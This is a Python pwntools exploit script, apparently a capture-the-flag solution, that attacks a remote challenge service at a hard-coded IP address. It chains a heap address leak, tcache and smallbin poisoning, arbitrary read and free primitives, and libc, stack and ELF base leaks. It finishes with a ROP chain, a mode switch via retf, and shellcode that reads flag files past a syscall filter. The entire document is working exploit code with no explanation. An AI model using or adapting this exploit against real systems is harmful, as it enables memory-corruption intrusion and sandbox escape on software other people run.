from pwn import *

context.arch = 'amd64'
context.os = 'linux'

io = remote('35.233.147.96', 42531)

ps = '√ '

def lmao():
    io.sendlineafter(ps.encode(), b'lmao')
    return io.recvline()

def rip(fle, data):
    if fle is None:
        io.sendlineafter(ps.encode(), b'rip')
    else:
        io.sendlineafter(ps.encode(), b'rip,' + fle)
    io.send(data)

def nsfw(fle, flag):
    io.sendlineafter(ps.encode(), b'nsfw,' + fle + b',' + str(flag).encode())

def gtfo(fle):
    io.sendlineafter(ps.encode(), b'gtfo,' + fle)

def wtf(data, fle):
    io.sendlineafter(ps.encode(), b'wtf,' + data + b',' + fle)

def stfu(user):
    io.sendlineafter(ps.encode(), b'stfu,' + user)

def asap(user, pw, retype_pw, pin):
    io.sendlineafter(ps.encode(), b'asap,' + user)
    io.sendafter(b'password:', pw)
    io.sendlineafter(b'retype password:', retype_pw)
    io.recvuntil(b'Q.E.D.\n')

def sus(user, pw):
    io.sendlineafter(ps.encode(), b'sus,' + user)
    if pw is not None:
        io.sendafter(b'password:', pw)

def ouo():
    io.sendlineafter(ps.encode(), b'ouo')
    return io.recvline(keepends = False)

def irl():
    io.sendlineafter(ps.encode(), b'irl')

for i in range(1, 8):
    nsfw(str(i).encode() * 0x3d7, 0x3)

stfu(b'0')
stfu(b'1')
heap_leak = b'\x80'
read_pw_halt = False
for i in range(1, 6):
    for c in range(0x100):
        if c == ord('\n'):
            continue
        if not read_pw_halt:
            io.sendlineafter(ps.encode(), b'asap,1')
            io.sendafter(b'password:', b'A' * 0x40)
            io.sendlineafter(b'retype password:', b'A' * 0x40)
        io.sendline(heap_leak + bytes([c]))
        data = io.recvline(timeout = 8)
        if b'asap:' not in data:
            heap_leak += bytes([c])
            log.info(f'heap_leak[{i}] = {c:#02x}')
            read_pw_halt = True
            break
        else:
            read_pw_halt = False

heap_leak = u64(heap_leak + b'\0\0')
heap_base = heap_leak - 0x2480
log.info(f'heap base = {heap_base:#x}')

nsfw(b'A', 0x3)
nsfw(b'B', 0x3)
nsfw(b'C', 0x3)

# Fill tcache (0x410)
for i in range(1, 8):
    nsfw(str(i).encode() * 0x3e7, 0x3)

# Require 0x20 chunks
for i in range(1, 5):
    nsfw(str(i).encode() * 0x17, 0x3)
for i in range(1, 5):
    gtfo(str(i).encode() * 0x17)

wtf(b'A' * 0x3e7, b'A')
#wtf(b'B' * 0x10 + b'/\x04//////' + b'B' * 0x3cf, b'B')
wtf(b'B' * 0x10 + b'\xa0///////' + b'B' * 0x3cf, b'B')
nsfw(b'A' * 0x3e7, 0x3)

for i in range(1, 8):
    gtfo(str(i).encode() * 0x3e7)

wtf(b'A' * 0x3f7, b'A') # 0x400
wtf(b'B' * 0x3f7, b'B') # 0x400
wtf(b'*' * 0x3f8, b'A') # 0x410
wtf(b'&' * 0x217, b'C') # 0x220

# Fill tcache (0x410)
for i in range(1, 7):
    nsfw(str(i).encode() * 0x3f8, 0x3)

for i in range(1, 7):
    gtfo(str(i).encode() * 0x3f8)

gtfo(b'C')

rip(b'A', b'A' * 0x10 + b'\n')
irl()
io.sendafter(ps.encode(), b'rip' + b',' * (0x400 - len('rip'))) # 0x221 -> 0x200

#victim = heap_base + 0x4740
#victim_ptr = heap_base + 0x42e0
victim = heap_base + 0x4630
victim_ptr = heap_base + 0x41d0
fake_fd = victim_ptr - 0x18
fake_bk = victim_ptr - 0x10

stfu(p64(victim)[:-2])
for i in range(2, 7):
    stfu(str(i).encode())

nsfw(b'#', 0x3)

nsfw(b'A', 0x3)
wtf(b'<' * 0x217, b'A')
wtf(b'A' * 0x1ff, b'A')
wtf(b'A' * 0x1fe, b'A')
wtf(b'A' * 0x1fd, b'A')
wtf(b'A' * 0x1fc, b'A')
wtf(b'A' * 0x1fb, b'A')
wtf(b'A' * 0x1f8 + b'\xc1\x09', b'A')

for i in range(1, 8):
    nsfw(str(i).encode() * 0x1f7, 0x3)
for i in range(1, 8):
    gtfo(str(i).encode() * 0x1f7)

#io.sendafter(ps.encode(), p64(0) + p64(0x401) + p64(fake_fd) + p64(fake_bk) + p64(0) + b'\n')
nsfw(b'A' * 0x157, 0x3)
io.sendafter(ps.encode(), b'\0' * 0x368 + p64(0xa1) + p64(fake_fd) + p64(fake_bk) + p64(0) + b'\n')
rip(b'A', b'A' * 0x100)

# clean 0x20 tacahe & small bin
for i in range(1, 8):
    nsfw(str(i).encode(), 0x3)

stfu(b'+')
nsfw(b'*', 0x3)
sus(b'+', None)

ps = 'e '

def arb_read(addr):
    io.sendafter(ps.encode(), b'\0' * 0x368 + p64(0x61) + b'\0' * 0x40 + p64(addr)[:-1] + b'\n')
    return ouo()

def arb_free(addr, fle):
    io.sendafter(ps.encode(), (b'gtfo,' + fle).ljust(0x368, b'\0') + p64(0x61) + b'\0' * 0x58 + p64(0x21) + p64(0) * 3 + p64(0x21) + p64(addr) + p64(0)[:-1] + b'\n')

flag1_addr = heap_base + 0x360
flag1 = arb_read(flag1_addr)
log.success(f'flag1 = {flag1.decode()}')
    
smallbin_ptr = heap_base + 0x790
libc_leak = arb_read(smallbin_ptr)
libc_leak = u64(libc_leak + b'\0\0')
libc_base = libc_leak - 0x1f6ce0
log.info(f'leak base = {libc_base:#x}')

environ = libc_base + 0x1fe320
stack_leak = arb_read(environ)
stack_leak = u64(stack_leak + b'\0\0')
log.info(f'stack leak = {stack_leak:#x}')

section_header_ptr = stack_leak + 0x50 
elf_leak = arb_read(section_header_ptr)
elf_leak = u64(elf_leak + b'\0\0')
elf_base = elf_leak - 0x40
log.info(f'elf leak = {elf_base:#x}')

gbuff = elf_base + 0x7050
#gbuff_p = heap_base + 0x4870
gbuff_p = heap_base + 0x4760

gbuff_p_enc = gbuff ^ (gbuff_p >> 12)
read_max_ret = stack_leak - 0x150

nsfw(b'@', 0x3)
nsfw(p64(gbuff_p_enc)[:-2], 0x3)

nsfw(b'-', 0x3)
gtfo(b'-')

tcache_entry = heap_base + 0x10
sus(b'root', None)

ps = '√ '

# free tcache
arb_free(tcache_entry, b'\x02')
# modify tcache & achieve arbitrary malloc
wtf(b'@' * 0x287, b'@')
for i in range(0x27f, 0x85, -1):
    wtf(b'@' * i, b'@')
wtf(b'@' * 0x80 + p64(gbuff_p)[:-2], b'@')
wtf(b'@' * 0x7e + b'\x01', b'@')
for i in range(0x7d, 0x1, -1):
    wtf(b'@' * i, b'@')
wtf(b'\x02', b'@')

nsfw(p64(read_max_ret)[:-2], 0x3)

mmap_region_wx = 0x10000
mmap_region_rw = 0x20000
mmap_length = 0x1000
flag_length = 0x80
wx = 0x6
rw = 0x3
flags = 0x22
fd = 0xffffffff
SYS_read = 0x0
SYS_writev = 0x14
SYS_mmap = 0x9
SYS_exit = 0x3c
SYS_close = 0x3
SYS_preadv = 0x127
STDIN_FILENO = 0
STDOUT_FILENO = 1
STDERR_FILENO = 2

pop_rax = libc_base + 0x3f8e3 
pop_rdi = libc_base + 0x23b65 
pop_rsi = libc_base + 0x251be
pop_rcx = libc_base + 0xe236e 
pop_rdx = libc_base + 0x165f32 
pop_rbp = libc_base + 0x23a60 
xchg_r10d_eax = libc_base + 0xd8595
pop_r8_test_ecx = libc_base + 0x8c2bb 
mov_r9_rsp_8_syscall = libc_base + 0x116a16
syscall_ret = libc_base + 0x8cad6
leave_ret = libc_base + 0x50717 
retf = libc_base + 0x22ad1

rop = flat([
        # mmap wx region
        pop_rcx,
        0,
        pop_r8_test_ecx,
        fd,
        pop_rdi,
        mmap_region_wx,
        pop_rsi,
        mmap_length,
        pop_rdx,
        wx,
        pop_rax,
        flags,
        xchg_r10d_eax,
        pop_rax,
        SYS_mmap,
        mov_r9_rsp_8_syscall,
        pop_rax,
        0,

        # mmap rw region
        pop_rcx,
        0,
        pop_r8_test_ecx,
        fd,
        pop_rdi,
        mmap_region_rw,
        pop_rsi,
        mmap_length,
        pop_rdx,
        rw,
        pop_rax,
        flags,
        xchg_r10d_eax,
        pop_rax,
        SYS_mmap,
        mov_r9_rsp_8_syscall,
        pop_rax,
        0,

        # call read
        pop_rdi,
        0,
        pop_rsi,
        mmap_region_wx,
        pop_rdx,
        mmap_length,
        pop_rax,
        SYS_read,
        syscall_ret,

        # close 0
        pop_rdi,
        STDIN_FILENO,
        pop_rax,
        SYS_close,
        syscall_ret,

        # stack pivoting
        pop_rbp,
        mmap_region_wx,
        leave_ret
    ])

io.sendline(rop)

rop2 = flat([
    mmap_region_wx + 0x38,
    retf,
    ((0x23) << 32) | (mmap_region_wx + 0x18),
    ])

shellcode1 = asm(f'''
    mov eax, {SYS_preadv}
    mov ebx, 0x3
    push 0x00003267
    push 0x616c662f
    mov ecx, esp
    xor edx, edx
    int 0x80
    mov esp, ebp
    nop
    nop
    nop
    retf
''', arch = 'i386', bits = 32)

shellcode2 = asm(f'''
    mov rax, {SYS_read}
    mov rdi, {STDIN_FILENO}
    mov rsi, {mmap_region_rw}
    mov rdx, {flag_length}
    syscall
    push rax
    push {mmap_region_rw}
    mov rax, {SYS_writev}
    mov rdi, {STDOUT_FILENO}
    mov rsi, rsp
    mov rdx, 1
    syscall
    mov rax, {SYS_exit}
    mov rdi, 0
    syscall
''', arch = 'amd64', bits = 64)

io.wait(1)
io.send(rop2 + shellcode1 + p64(((0x33) << 32) | (mmap_region_wx + 0x40)) + shellcode2)

io.recvuntil(ps.encode())
flag2 = io.recvline(keepends = False)

log.success(f'flag2 = {flag2.decode()}')

io.close()
